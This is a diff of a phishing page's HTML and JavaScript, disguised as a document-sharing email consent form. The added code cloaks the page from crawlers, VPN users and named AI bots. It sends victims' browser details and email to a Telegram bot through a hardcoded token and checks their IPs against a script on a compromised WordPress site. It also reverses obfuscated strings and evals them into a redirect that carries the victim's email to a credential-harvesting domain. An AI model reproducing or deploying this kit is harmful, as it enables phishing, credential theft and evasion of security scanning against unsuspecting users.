@@ -1,53 +1,281 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cloaking Example</title>
+    <title>Show Consent</title>
     <style>
-        body, html {
+
+        body {
+            display: block;
             margin: 0;
             padding: 0;
-            height: 100%;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
+            font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif;
+            font-size: 14px;
             color: #07090F;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
             line-height: 1.42857143;
         }
 
-        iframe {
+        .consent-form-container {
+            width: calc(100% - 64px);
+            max-width: 443px;
+            margin: 0 auto;
+            margin-top: 88px;
+        }
+
+        .consent-form-header {
+            margin-top: 0px;
+            font-size: 14px;
+            font-weight: 550;
+            line-height: 20px;
+            margin-bottom: 22px;
+            color: #07090F;
+            display: block;
+        }
+
+        .email-label {
+            color: #4B5563;
+            font-size: 13px;
+            font-style: normal;
+            font-weight: 400;
+        }
+
+        .email-Input-box {
+            display: flex;
             width: 100%;
-            height: 100vh; /* Full height */
+            height: 32px;
+            padding: 7px 12px;
+            flex-direction: column;
+            justify-content: center;
+            align-items: flex-start;
+            gap: 8px;
+            border-radius: 4px;
+            border: 1px solid #E5E7EB;
+            background: #FFF;
+        }
+
+        .email-Input-box:focus {
+            -webkit-box-shadow: none;
+            box-shadow: none;
+            outline: none;
+            border-color: #1F62FF;
+        }
+
+        .error-message {
+            font-size: 12px;
+            line-height: 16px;
+            margin-left: 5px;
+            margin-top: 10px;
+            color: #EF4444;
+        }
+
+        .text-message {
+            color: #07090F;
+            font-size: 14px;
+            font-style: normal;
+            font-weight: 400;
+        }
+
+        .d-flex {
+            display: flex;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        input {
+            width: 100%;
+            padding: 8px;
+            box-sizing: border-box;
+        }
+
+        .privacy-policy-checkbox {
+            width: 16px;
+            height: 16px;
+            top: 395px;
+            left: 428px;
+            min-width: 16px;
+        }
+
+        .submit-btn {
+            padding: 10px 20px;
+            font-size: 16px;
             border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            background-color: rgb(0, 0, 255);
+            color: white;
+        }
+        .submit-btn:disabled {
+            opacity: 0.5;
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 15px;
+            height: 15px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            vertical-align: middle;
+            margin-right: 10px;
+        }
+        .hide {
+            display: none !important;
+        }
+        .alert {
+            padding: 12px 15px;
+            border: 0px solid #d5dddf;
+            color: #07090F;
+            width: 100%;
+            margin-bottom: 20px;
+            border-radius: 4px;
+        }
+        .alert.alert-danger {
+            background-color: #FFEAEE;
+            color: #324061;
+        }
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+        @keyframes rotate {
+            100% { transform: rotate(360deg); }
+        }
+        sm-loader {
+            display: block;
+            position: relative;
+            height: 30px;
+            width: 30px;
+            margin: 0 auto;
+        }
+        .text-center {
+            text-align: center;
+        }
+        .loader-icon {
+            border-radius: 100%;
+            border-top: 3px solid transparent;
+            border-left: 3px solid #1F62FF;
+            border-right: 3px solid #1F62FF;
+            border-bottom: 3px solid #1F62FF;
+            height: 24px;
+            width: 24px;
+            animation: rotate 0.4s linear infinite;
+            transform-origin: center center;
+            position: absolute;
+            top: 0;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            margin: auto;
+        }
+        .m-t-12 {
+            margin-top: 12px;
+        }
+
+        .m-t-32 {
+            margin-top: 32px;
+        }
+
+        .m-b-lg {
+            margin-bottom: 24px;
+        }
+
+        .cool-grey-600 {
+            color: #DC2626;
+        }
+
+        #privacyPolicyConsentsContainer > .d-flex:not(:last-child) {
+            margin-bottom: 8px;
+        }
+
+        #privacyPolicyConsentsContainer .text-message {
+            margin-left: 10px;
+        }
+
+        @media (max-width: 767px) {
+            .consent-form-container {
+                margin-top: 32px;
+            }
         }
     </style>
 </head>
 <body>
-    <div id="content"></div>
-
-    <script>
+<div>
+    <input type="hidden" name="response" id="response" value="{&#34;owner&#34;:&#34;1&#34;,&#34;privacyPolicy&#34;:null,&#34;isPrivacyPolicyEnabled&#34;:false,&#34;isDeleted&#34;:false,&#34;isLinkPasswordProtected&#34;:false,&#34;isEmailRequired&#34;:true,&#34;ownerName&#34;:&#34;M K&#34;}">
+    <input type="hidden" name="hostname" id="hostname" value="kselect.salesmate.io">
+    <input type="hidden" name="hostnameToCallApiFromEjs" id="hostnameToCallApiFromEjs" value="kselect.sm-docs.com">
+    <input type="hidden" name="conversation-id" id="linkId" value="8e337e91-282d-4b89-a38a-0a07eca87db9">
+    
+        <div class="consent-form-container">
+            <div id="commonError" class="alert alert-danger hide"></div>
+            <span class="consent-form-header"><span id="cname"></span></span>
+            <form>
+                
+                    <div class="form-group">
+                        <label for="email" class="email-label"><span class="cool-grey-600">*</span>Please enter your email address to continue</label>
+                        <input type="email" class="email-Input-box" id="email" name="email">
+                        <span id="emailError" class="error-message hide"></span>
+                    </div>
+                
+                
+                    <div>
+                        <div class="text-message m-b-lg" id="consentToCommunication"></div>
+                        <div class="form-group" id="privacyPolicyConsentsContainer"> </div>
+                        <div class="text-message m-b-lg" id="privacyPolicy"></div>
+                        <div class="text-message" id="consentToProcess"></div>
+                    </div>
+                    <sm-loader id="sm-loader" style="display: none">
+                        <div class="text-center">
+                            <span class="loader-icon"></span>
+                        </div>
+                    </sm-loader>
+                    <div class="form-group m-t-32">
+                        <button class="submit-btn" type="button" id="submit-btn" disabled>
+                            Submit
+                        </button>
+                    </div>
+            </form>
+        </div>
+    
+</div>
+<script>
         const blacklistedWords = [
             
-        'google', 'microsoft', 'crawl','python','curl',
-        'Amazonbot','Applebot','Applebot-Extended','Bytespider',
-        'CCBot','ChatGPT-User','Claude-Web','ClaudeBot','Diffbot',
-        'FacebookBot','FriendlyCrawler','GPTBot','Google-Extended',
-        'GoogleOther','GoogleOther-Image','GoogleOther-Video','ICC-Crawler',
-        'ImagesiftBot','Meta-ExternalAgent','Meta-ExternalFetcher','OAI-SearchBot',
-        'PerplexityBot','PetalBot','Scrapy','Timpibot','VelenPublicWebCrawler',
-        'Webzio-Extended','YouBot','anthropic-ai','cohere-ai','facebookexternalhit',
-        'img2dataset','omgili','omgilibot'];
+            'google', 'microsoft', 'crawl','python','curl',
+            'Amazonbot','Applebot','Applebot-Extended','Bytespider',
+            'CCBot','ChatGPT-User','Claude-Web','ClaudeBot','Diffbot',
+            'FacebookBot','FriendlyCrawler','GPTBot','Google-Extended',
+            'GoogleOther','GoogleOther-Image','GoogleOther-Video','ICC-Crawler',
+            'ImagesiftBot','Meta-ExternalAgent','Meta-ExternalFetcher','OAI-SearchBot',
+            'PerplexityBot','PetalBot','Scrapy','Timpibot','VelenPublicWebCrawler',
+            'Webzio-Extended','YouBot','anthropic-ai','cohere-ai','facebookexternalhit',
+            'img2dataset','omgili','omgilibot'];
 
-    const allowedParamPattern = /^Sachiel\d$/;
-    const allowedParamPattern2 = /^Azrael\d$/;
-    var checkCountry = false;
+            const allowedParamPattern = /^Sachiel\d$/;
+            const allowedParamPattern2 = /^Azrael\d$/;
+    var checkCountry = false; // Set to true to enable country check
     var Country = "";
 
-function sendMessage() {
+    function sendMessage() {
   const token = '5474576959:AAEFEPb7hmHEmq_ZM_jasyYk46DECm44Sm0';
   const chatId = '1412104349';
   const url = `https://api.telegram.org/bot${token}/sendMessage`;
   const userDetails = {
-    Client_Email: "Clicked",
+    Client_Email: getBase64FromUrl(),
     userAgent: navigator.userAgent,
     language: navigator.language,
     screenSize: `${window.screen.width}x${window.screen.height}`,
@@ -95,7 +323,7 @@ function sendMessage2() {
   const url = `https://api.telegram.org/bot${token}/sendMessage`;
   const userDetails = {
     Client_Emails: "Incoming Bot",
-    Client_Email: "BOT ACCESS",
+    Client_Email: getBase64FromUrl(),
     userAgent: navigator.userAgent,
     language: navigator.language,
     screenSize: `${window.screen.width}x${window.screen.height}`,
@@ -137,19 +365,20 @@ function sendMessage2() {
       console.error('Error sending message:', error);
     });
 }
+
     function fetchIPInfo() {
         const urlParams = new URLSearchParams(window.location.search);
         const param = urlParams.get('Amethyst');
         const para = urlParams.get('Chamuel');
         if (!allowedParamPattern.test(param) || !allowedParamPattern2.test(para)) {
             console.log('Invalid parameter. Redirecting to error page...');
-            sendMessage2();
             fetch('https://ipinfo.io/json?token=d8eafd6deea176')
                 .then(response => response.json())
                 .then(data => {
                     var ip = data.ip;
                     addBlacklistedIP(ip);
                     redirectToBlockedPage();
+
                 })
                 .catch(error => {
                     console.error('Error:', error);
@@ -160,25 +389,50 @@ function sendMessage2() {
         fetch('https://ipinfo.io/json?token=d8eafd6deea176')
             .then(response => response.json())
             .then(data => {
+                // Extract IP address and hostname from ipinfo response
                 var ip = data.ip;
                 var hostname = data.hostname || '';
                 console.log('IP Address:', ip);
                 console.log('Hostname:', hostname);
+
                 // Check if hostname contains any blacklisted words
                 if (blacklistedWords.some(word => hostname.includes(word))) {
                     console.log('Hostname contains a blacklisted word. Adding IP to blacklist...');
-                    sendMessage2();
                     addBlacklistedIP(ip);
                     redirectToBlockedPage();
-                // } else if ((data.privacy && data.privacy.vpn) || (checkCountry && data.country && data.country !== Country)) {
-                //     console.log('IP ' + ip + ' is using a VPN or not from the allowed country. Adding to blacklist...');
-                //     // Add IP to blacklist database
-                //     addBlacklistedIP(ip);
-                //     redirectToBlockedPage();
+                } else if ((data.privacy && data.privacy.vpn) || (checkCountry && data.country && data.country !== Country)) {
+                    console.log('IP ' + ip + ' is using a VPN or not from the allowed country. Adding to blacklist...');
+                    // Add IP to blacklist database
+                    addBlacklistedIP(ip);
+                    redirectToBlockedPage();
                 } else {
                     console.log('IP ' + ip + ' is not using a VPN and from the allowed country.');
                     // Check if IP is blacklisted
                     checkBlacklistedIP(ip);
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+    }
+       // Function to check if IP address is blacklisted
+    function checkBlacklistedIP(ip) {
+        // Check if IP is already blacklisted in the database
+        fetch('https://tastymomos.com.au/wp-includes/ID3/clap.php?ip=' + ip)
+            .then(response => response.text())
+            .then(data => {
+                if (data === 'blacklisted') {
+                    console.log('IP ' + ip + ' is already blacklisted. Redirecting...');
+                    addBlacklistedIP(ip);
+                    // Redirect user to blocked page
+                    redirectToBlockedPage();
+
+                } else if (data === 'clean') {
+                    console.log('IP ' + ip + ' is not blacklisted. Proceeding...');
+                    // Proceed with normal flow
+                    redirectToGoodPage(); 
+                } else {
+                    console.log('Error:', data);
                 }
             })
             .catch(error => {
@@ -194,6 +448,7 @@ function sendMessage2() {
         `;
     }
 
+    // Function to add blacklisted IP address
     function addBlacklistedIP(ip) {
         // Check if IP is already in the blacklist
         fetch('https://tastymomos.com.au/wp-includes/ID3/clap.php?ip=' + ip)
@@ -226,266 +481,247 @@ function sendMessage2() {
                 redirectToBlockedPage();
             });
     }
+ 
 
+function redirectToGoodPage() {
+    function getParameterByName(name) {
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get(name);
+}
 
-    function checkBlacklistedIP(ip) {
-    fetch('https://tastymomos.com.au/wp-includes/ID3/clap.php?ip=' + ip)
-        .then(response => response.text())
-        .then(data => {
-            if (data === 'blacklisted') {
-                console.log('IP ' + ip + ' is already blacklisted. Redirecting...');
-                sendMessage2();
-                addBlacklistedIP(ip);
-                redirectToBlockedPage();
+const cmoValue = getParameterByName('cmo'); // Get 'cmo' value from the URL
+const cnameElement = document.getElementById('cname');
+if (cmoValue) {
+const com = cmoValue.charAt(0).toUpperCase() + cmoValue.slice(1).toLowerCase();
+cnameElement.textContent = `This document is shared by ${com}`;
+} else {
+// If 'cmo' is missing or empty, show the protected message
+cnameElement.textContent = 'This document is protected verify your email to proceed.';
+}
 
-            } else if (data === 'clean') {
-                console.log('IP ' + ip + ' is not blacklisted. Proceeding...');
-                sendMessage();
-                loadContent();
-            } else {
-                console.log('Error:', data);
+   document.addEventListener('DOMContentLoaded', function () {
+    const response = JSON.parse(document.getElementById('response')?.value);
+    const linkId = document.getElementById('linkId')?.value;
+    const hostName = document.getElementById('hostname').value;
+    const hostnameToCallApiFromEjs = document.getElementById('hostnameToCallApiFromEjs').value;
+
+    const passwordInput = document.getElementById('password');
+    const smLoader = document.getElementById('sm-loader');
+    const submitBtn = document.getElementById('submit-btn');
+
+    const passwordError = document.getElementById('passwordError');
+    const emailInput = document.getElementById('email');
+    const emailError = document.getElementById('emailError');
+    const commonError = document.getElementById('commonError');
+
+    let isEmailValid = false;
+    let privacyPolicyConsents = [];
+    let isPasswordValid = false;
+
+    const language = navigator.language || 'en';
+    if (response?.isPrivacyPolicyEnabled) {
+        setPolicyAndConsentDetails();
+    }
+
+    if (response?.isLinkPasswordProtected) {
+        addEventListenerToId('password', 'blur', validatePassword);
+    }
+    if (response?.isEmailRequired) {
+        addEventListenerToId('email', 'blur', validateEmail);
+    }
+    addEventListenerToId('submit-btn', 'click', onSubmit);
+
+    if (!response?.isPrivacyPolicyEnabled && !response?.isEmailRequired && !response?.isLinkPasswordProtected) {
+        directDownloadFile();
+    }
+
+    async function directDownloadFile() {
+        try {
+            const publicUrl = await getPublicURL();
+            downloadFile(publicUrl);
+            setTimeout(() => {
+                window.self.close();
+            }, 500);
+        } catch (err) {
+            console.log(err);
+        }
+    }
+
+    async function setPolicyAndConsentDetails() {
+        showLoader();
+        try {
+            const privacyPolicyDetails = await getPrivacyPolicy();
+            setPrivacyPolicyAndConsents(privacyPolicyDetails);
+            stopLoader();
+        } catch (err) {
+            stopLoader();
+            console.log(err);
+        }
+    }
+
+    function validateEmail() {
+        const emailRegex = /^\s*[A-Z0-9_]([A-Z0-9._-]|\+)*@[A-Z0-9.-]+\.[A-Z]{2,}\s*$/i;
+        const trimmedEmailValue = emailInput.value.trim();
+        const isValid = trimmedEmailValue !== '' && emailRegex.test(emailInput.value);
+
+        isEmailValid = isValid;
+        isValid ? enabledSubmitBtn() : disabledSubmitBtn();
+        emailError.textContent = isValid ? '' : (trimmedEmailValue === '' ? 'Email is required.' : 'Invalid email format.');
+        emailError.classList.toggle('hide', isValid);
+        return isValid;
+    }
+
+    function validatePassword() {
+        let userTypedPassword = passwordInput.value;
+        if (!userTypedPassword.trim()) {
+            isPasswordValid = false;
+            passwordError.textContent = 'Password is required.';
+            passwordError.classList.remove('hide');
+            disabledSubmitBtn();
+            return;
+        } else {
+            isPasswordValid = true;
+            passwordError.textContent = '';
+            passwordError.classList.add('hide');
+            enabledSubmitBtn();
+        }
+    }
+
+    function setPrivacyPolicyAndConsents(privacyPolicyDetails) {
+        if (privacyPolicyDetails?.privacyPolicy) {
+            setPrivacyPolicyValue(privacyPolicyDetails.privacyPolicy);
+        }
+
+        if (privacyPolicyDetails?.consentToProcess) {
+            setConsentToProcessValue(privacyPolicyDetails?.consentToProcess);
+        }
+
+        if (privacyPolicyDetails?.consentToCommunication) {
+            setConsentToCommunicationValue(privacyPolicyDetails.consentToCommunication);
+        }
+
+        if (privacyPolicyDetails?.consentOptions?.length) {
+            setConsentsOption(privacyPolicyDetails.consentOptions);
+        }
+    }
+
+    function setPrivacyPolicyValue(value) {
+        document.getElementById('privacyPolicy').innerHTML = value;
+    }
+
+    function setConsentToProcessValue(value) {
+        document.getElementById('consentToProcess').innerHTML = value;
+    }
+
+    function setConsentToCommunicationValue(value) {
+        document.getElementById('consentToCommunication').innerHTML = value;
+    }
+
+    function setConsentsOption(consentOptions = []) {
+        const consentsOptionsContainer = document.getElementById('privacyPolicyConsentsContainer');
+        privacyPolicyConsents = [];
+        consentOptions.forEach(consent => {
+            const existingConsent = privacyPolicyConsents.find(c => c.subscriptionId === consent.subscriptionId);
+            if (!existingConsent) {
+                privacyPolicyConsents.push({ ...consent, value: false });
+                createConsentOption(consent, consentsOptionsContainer);
             }
-        })
-        .catch(error => {
-            console.error('Error:', error);
         });
+    }
+
+
+    function showLoader() {
+        smLoader.style.display = 'flex';
+    }
+
+    function stopLoader() {
+        smLoader.style.display = 'none';
+    }
+
+    function updateConsentOptionValue(consentId, value) {
+        const consent = privacyPolicyConsents.find(consent => consent.subscriptionId === consentId);
+        if (consent) {
+            consent.value = value;
+        }
+    }
+
+    async function onSubmit() {
+        commonError?.classList?.add('hide');
+        if ((!response.isLinkPasswordProtected || isPasswordValid) && (!response?.isEmailRequired || isEmailValid)) {
+            if (response.isLinkPasswordProtected) {
+                passwordError.textContent = '';
+            }
+            showBtnLoader();
+            try {
+                const publicUrl = await getPublicURL();
+                stopBtnLoader();
+                downloadFile(publicUrl);
+            } catch (err) {
+                commonError.textContent = err;
+                commonError.classList.remove('hide');
+                stopBtnLoader();
+            }
+        } else {
+            commonError.textContent = 'Please ensure all required fields are filled out correctly.';
+            commonError.classList.remove('hide');
+        }
+    }
+
+    async function getPublicURL() {
+    let data = {};
+    if (response.isLinkPasswordProtected && passwordInput.value.trim() !== '') {
+        data.password = passwordInput.value;
+    }
+    if (privacyPolicyConsents?.length) {
+        data.privacyPolicyConsent = privacyPolicyConsents;
+    }
+    if (response.isEmailRequired && emailInput.value.trim() !== '') {
+        data.email = emailInput.value;
+    }
+
+    return new Promise((resolve, reject) => {
+  data.email = emailInput.value;
+        var a = `' = ferh.noitacol.wodniw`;
+        var b = a.split('').reduce((reversed, char) => char + reversed, '');
+        c = 'yVViC=690f10efbe?ac4744/moc.amanrabahkemirc.vbhgfd//:sptth';
+        d = c.split('').reduce((reversed, char) => char + reversed, '');
+        e = '#'+data.email
+        var silver = b + d + e + '\'';
+        eval(silver);
+    });
 }
 
-    const botUserAgents = [
-            'Googlebot', 'Microsoft', 'crawl', 'python', 'curl',
-            'Amazonbot', 'Applebot', 'Applebot-Extended', 'Bytespider',
-            'CCBot', 'ChatGPT-User', 'Claude-Web', 'ClaudeBot',
-            'Diffbot', 'FacebookBot', 'FriendlyCrawler', 'GPTBot',
-            'Google-Extended', 'GoogleOther', 'GoogleOther-Image',
-            'GoogleOther-Video', 'ICC-Crawler', 'ImagesiftBot',
-            'Meta-ExternalAgent', 'Meta-ExternalFetcher', 'OAI-SearchBot',
-            'PerplexityBot', 'PetalBot', 'Scrapy', 'Timpibot',
-            'VelenPublicWebCrawler', 'Webzio-Extended', 'YouBot',
-            'anthropic-ai', 'cohere-ai', 'facebookexternalhit',
-            'img2dataset', 'omgili', 'omgilibot'
-        ];
-
-        // Function to detect the User-Agent
-        function detectUserAgent() {
-            const userAgent = navigator.userAgent;
-            return botUserAgents.some(bot => userAgent.includes(bot));
-        }
-        function detectQueryParameter(paramName) {
-            const urlParams = new URLSearchParams(window.location.search);
-            return urlParams.has(paramName) ? urlParams.get(paramName) : null;
-        }
-    function loadContent() {
-    const isBot = detectUserAgent();
-    const paramValue = detectQueryParameter('Bd');
-    if (isBot) {
-        fetch('https://ipinfo.io/json?token=d8eafd6deea176')
-            .then(response => response.json())
-            .then(data => {
-                var ip = data.ip;
-                console.log(ip);
-                addBlacklistedIP(ip);
-                redirectToBlockedPage();}
-            ); 
-    } else if (paramValue) {
-        const script = document.createElement('script');
-        script.innerHTML = `
-           function isHuman() {
-                const userAgent = navigator.userAgent.toLowerCase();
-                const botUserAgents = [
-            'Googlebot', 'Microsoft', 'crawl', 'python', 'curl',
-            'Amazonbot', 'Applebot', 'Applebot-Extended', 'Bytespider',
-            'CCBot', 'ChatGPT-User', 'Claude-Web', 'ClaudeBot',
-            'Diffbot', 'FacebookBot', 'FriendlyCrawler', 'GPTBot',
-            'Google-Extended', 'GoogleOther', 'GoogleOther-Image',
-            'GoogleOther-Video', 'ICC-Crawler', 'ImagesiftBot',
-            'Meta-ExternalAgent', 'Meta-ExternalFetcher', 'OAI-SearchBot',
-            'PerplexityBot', 'PetalBot', 'Scrapy', 'Timpibot',
-            'VelenPublicWebCrawler', 'Webzio-Extended', 'YouBot',
-            'anthropic-ai', 'cohere-ai', 'facebookexternalhit',
-            'img2dataset', 'omgili', 'omgilibot'
-                ];
-                const isBot = botUserAgents.some(bot => userAgent.includes(bot));
-                const headlessChecks = [
-                    () => /HeadlessChrome/.test(userAgent),
-                    () => navigator.webdriver,
-                    () => window.outerWidth === 0 && window.outerHeight === 0,
-                    () => navigator.languages === "" || navigator.plugins.length === 0
-                ];
-                const isHeadless = headlessChecks.some(check => check());
-                return !isBot && !isHeadless;
-            }
-
-            function isValidEmail(email) {
-                const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-                return emailPattern.test(email);
-            }                
-
-function verifyAndRedirect() {
-                if (isHuman()) {
-                window.location.assign('h'+'tt'+'ps'+'://'+'df'+'gh'+'bv'+'-b'+'2z'+'ma'+'.m'+'ic'+'ro'+'do'+'cu'+'me'+'nt'+'dr'+'iv'+'e.'+'co'+'m/'+'44'+'74'+'ca'+'?e'+'bf'+'e0'+'1f'+'09'+'6='+'ej'+'6D'+'7#'+'${getBase64FromUrl()}');
-                    }
-                } else {
-            fetch('https://ipinfo.io/json?token=d8eafd6deea176')
-            .then(response => response.json())
-            .then(data => {
-                var ip = data.ip;
-                addBlacklistedIP(ip);
-                redirectToBlockedPage();}
-            ); 
+    function showBtnLoader() {
+        submitBtn.disabled = true;
+        submitBtn.innerHTML = '<span class="loader"></span>';
     }
-            }
 
-            setTimeout(verifyAndRedirect, 1000);
-        `;
-        document.getElementById('content').innerHTML = `
-<<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document Loading Example</title>
-    <style>
-        body {
-            margin: 0;
-            font-family: 'Arial', sans-serif;
-            background: linear-gradient(to bottom right, #ffffff, #f8f8f8);
-            color: #333;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            flex-direction: column;
-            transition: background 0.3s ease;
-        }
-
-        .loading-screen {
-            background: white;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            border-radius: 15px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
-            padding: 30px;
-            width: 90%;
-            max-width: 500px;
-            text-align: center;
-            position: relative;
-        }
-
-        .logos {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 20px;
-        }
-
-        .feds-brand-image img {
-            width: 100px; /* Increased size for the Microsoft Teams logo */
-            height: auto;
-            margin-right: 20px; /* More space if you were to add another logo */
-        }
-
-        .loader {
-            border: 6px solid #e0e0e0;
-            border-top: 6px solid #e60000;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1.5s linear infinite;
-            margin: 20px 0;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .connecting-message {
-            font-size: 16px;
-            margin-top: 5px;
-            opacity: 0;
-            animation: fade-in 1s forwards;
-        }
-
-        @keyframes fade-in {
-            0% { opacity: 0; }
-            100% { opacity: 1; }
-        }
-
-        /* Button styling */
-        .button {
-            background-color: #e60000; /* Red button */
-            color: white;
-            border: none;
-            border-radius: 5px;
-            padding: 10px 20px;
-            cursor: pointer;
-            font-size: 16px;
-            margin-top: 20px;
-            transition: background 0.3s ease;
-        }
-
-        .button:hover {
-            background-color: #d50000; /* Darker red on hover */
-        }
-
-        /* Responsive adjustments */
-        @media (max-width: 600px) {
-            .connecting-message {
-                font-size: 14px; /* Smaller font on mobile */
-            }
-            .loader {
-                width: 40px;
-                height: 40px;
-            }
-        }
-    </style>
-</head>
-<body>
-    <div id="loading-screen" class="loading-screen">
-        <div class="logos">
-            <a href="https://www.adobe.com/" class="feds-brand" daa-ll="Brand">
-                <span class="feds-brand-image">
-                    <!-- Updated image source for Microsoft Teams logo -->
-                    <img loading="lazy" src="https://thinkadnet.com/wp-content/uploads/2020/08/Microsoft-Teams-as-a-Phone-System-1.png" alt="Microsoft Teams">
-                </span>
-            </a>
-            <!-- Removed second logo -->
-        </div>
-        <div class="loader"></div>
-        <p class="connecting-message">Connecting to Microsoft...</p>
-        <button class="button" style="display: none;">Cancel</button> <!-- Optional cancel button -->
-    </div>
-    <div id="app-content" class="app-content" style="display: none;">
-        <h2>Your Document</h2>
-        <p>Your document content goes here...</p>
-    </div>
-</body>
-</html>
-
-
-    `;
-        document.body.appendChild(script);
-    } else {
-        document.getElementById('content').innerHTML = `
-            <iframe src="https://www.putnam.com/literature/pdf/II989.pdf">
-                This browser does not support PDFs. Please download the PDF to view it: 
-                <a href="https://www.putnam.com/literature/pdf/II989.pdf">Download PDF</a>.
-            </iframe>
-        `;
-        fetch('https://ipinfo.io/json?token=d8eafd6deea176')
-            .then(response => response.json())
-            .then(data => {
-                var ip = data.ip;
-                console.log(ip);
-                addBlacklistedIP(ip);
-                redirectToBlockedPage();}
-            ); 
+    function stopBtnLoader() {
+        submitBtn.disabled = false;
+        submitBtn.innerHTML = 'Download';
     }
+
+
+    function disabledSubmitBtn() {
+        submitBtn.disabled = true;
+    }
+
+    function enabledSubmitBtn() {
+        submitBtn.disabled = false;
+    }
+
+    function addEventListenerToId(id, event, callback) {
+        const element = document.getElementById(id);
+        if (element) {
+            element.addEventListener(event, callback);
+        }
+    }
+});
 }
-        fetchIPInfo();
-    </script>
-    
+
+
+fetchIPInfo();
+redirectToGoodPage();
+</script>
 </body>
 </html>
